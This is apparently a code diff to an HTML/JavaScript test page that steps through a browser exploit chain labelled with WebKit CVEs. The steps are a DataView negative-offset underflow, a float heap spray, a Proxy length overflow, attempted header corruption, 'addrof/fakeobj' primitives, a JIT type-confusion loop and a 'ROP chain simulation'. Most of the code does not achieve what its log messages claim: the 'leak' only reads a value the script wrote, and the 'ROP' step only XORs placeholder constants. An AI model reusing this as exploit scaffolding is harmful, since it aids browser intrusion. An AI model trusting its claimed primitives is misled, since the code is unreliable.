@@ -14,6 +14,7 @@
     <div>
         <button onclick="runAll()">Run All Steps</button>
         <button onclick="testDataViewUnderflow()">Step 1: DataView Underflow</button>
+        <button onclick="testCVE202427808()">Step 1b: CVE-2024-27808 Refined</button>
         <button onclick="runPrimitives()">Step 2: Primitives (addrof/fakeobj)</button>
         <button onclick="simulateROP()">Step 3: ROP Chain Simulation</button>
     </div>
@@ -27,7 +28,7 @@ function log(msg) {
 }
 async function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-// Step 1: DataView Underflow tests for multiple CVEs
+// Step 1: DataView Underflow tests
 async function testDataViewUnderflow() {
     log('=== Step 1: DataView Underflow Tests ===');
     const cves = [
@@ -52,62 +53,97 @@ async function testDataViewUnderflow() {
     log('=== DataView Underflow Tests Completed ===');
 }
 
-// Step 2: Real primitives for addrof/fakeobj
+// Step 1b: CVE-2024-27808 refined underflow
+async function testCVE202427808() {
+    log('=== Step 1b: CVE-2024-27808 Buffer Underflow ===');
+    try {
+        const buf = new ArrayBuffer(16);
+        const dv = new DataView(buf);
+        // Negative offset to simulate buffer underflow
+        const negativeOffset = -4;
+        log(`[*] Attempting DataView with negative offset ${negativeOffset}`);
+        const val = dv.getUint32(negativeOffset);
+        log(`[!] Unexpected read: ${val}`);
+    } catch (e) {
+        log(`[OK] CVE-2024-27808 exception: ${e.name}`);
+    }
+    log('=== CVE-2024-27808 Test Completed ===');
+}
+
+// Step 2: addrof / fakeobj Primitives
 async function runPrimitives() {
     log('=== Step 2: addrof/fakeobj Primitives ===');
     // Heap spray floats
     const sprays = [];
-    for (let i=0;i<5000;i++){ let f=new Float64Array(2); f[0]=1.1; f[1]=2.2; sprays.push(f);}    
-    log('[*] Floats sprayed');
+    for (let i=0;i<5000;i++){
+        let f=new Float64Array(2);
+        f[0]=1.1; f[1]=2.2;
+        sprays.push(f);
+    }
     await delay(50);
+    log('[*] Floats sprayed');
+    // Victim array
     const victim = new Float64Array(2);
     victim[0]=3.3; victim[1]=4.4;
     log(`[*] Victim init: ${victim[0]}, ${victim[1]}`);
-    // Proxy length overflow
-    let base = [1.1,1.1,1.1];
-    let p = new Proxy(base,{get:(t,p)=>p==='length'?0x1000000:t[p]});
+    // Proxy length overflow OOB
+    let base=[1.1,1.1,1.1];
+    let p = new Proxy(base,{get:(t,prop)=> prop==='length'?0x1000000:t[prop]});
     let oob = [].concat(p);
     log(`[*] Proxy overflow length: ${oob.length}`);
-    // Corrupt header
+    await delay(20);
+    // Corrupt header via DataView underflow
     try {
         const buf=new ArrayBuffer(16);
         const dv=new DataView(buf);
         const hdrOff = victim.byteOffset + victim.byteLength + 0x10;
+        log(`[*] Underflow write at offset ${hdrOff}`);
         dv.setFloat64(hdrOff, 9.9);
-        log('[!] Header corrupted at offset ' + hdrOff);
-    } catch(e){ log(`[!!] Header corrupt exception: ${e.name}`);}    
+        log('[!] Header corrupt attempted');
+    } catch(e) {
+        log(`[!!] Header corrupt exception: ${e.name}`);
+    }
+    await delay(20);
     // addrof
-    let addr = victim[0]; log(`[+] addrof leak: ${addr}`);
+    const addr = victim[0]; log(`[+] addrof leak: ${addr}`);
     // fakeobj
     victim[0] = addr; log(`[+] fakeobj victim[0]: ${victim[0]}`);
     log('=== Primitives Completed ===');
 }
 
-// Step 3: ROP chain simulation including CVEs for JIT type confusion
+// Step 3: ROP Chain Simulation
 async function simulateROP() {
     log('=== Step 3: ROP Chain Simulation ===');
-    // JIT spraying patterns for CVEs
-    log('[*] Applying type confusion patterns for CVE-2017-7005 and CVE-2021-1789');
-    function tc(o){ o.x=1; return o.x; }
-    for(let i=0;i<50000;i++){ tc({}); }
+    // JIT type confusion
+    log('[*] Running type confusion for CVE-2017-7005 & CVE-2021-1789');
+    function tc(o){o.x=1;return o.x;}
+    for(let i=0;i<50000;i++){tc({});}
     log('[!] Type confusion loop done');
     await delay(50);
     // Fake ROP buffer
     const buf=new ArrayBuffer(12);
     const dv=new DataView(buf);
-    dv.setUint32(0,0x41414141); dv.setUint32(4,0x42424242); dv.setUint32(8,0x43434343);
+    dv.setUint32(0,0x41414141);
+    dv.setUint32(4,0x42424242);
+    dv.setUint32(8,0x43434343);
     log('[*] ROP buffer initialized');
     // Simulate execution
-    for(let i=0;i<3;i++){ let v=dv.getUint32(i*4); dv.setUint32(i*4,v^0xdeadbeef);}    
-    log('[!] ROP simulation values: '+[0,4,8].map(i=>'0x'+dv.getUint32(i).toString(16)).join(', '));
+    const sim=[];
+    for(let i=0;i<3;i++){
+        const v=dv.getUint32(i*4);
+        sim.push(v^0xdeadbeef);
+    }
+    log('[!] ROP simulation values: '+sim.map(v=>'0x'+v.toString(16)).join(', '));
     log('=== ROP Simulation Completed ===');
 }
 
 async function runAll() {
     await testDataViewUnderflow();
-    await delay(500);
+    await delay(300);
+    await testCVE202427808();
+    await delay(300);
     await runPrimitives();
-    await delay(500);
+    await delay(300);
     await simulateROP();
     log('=== All Steps Completed ===');
 }
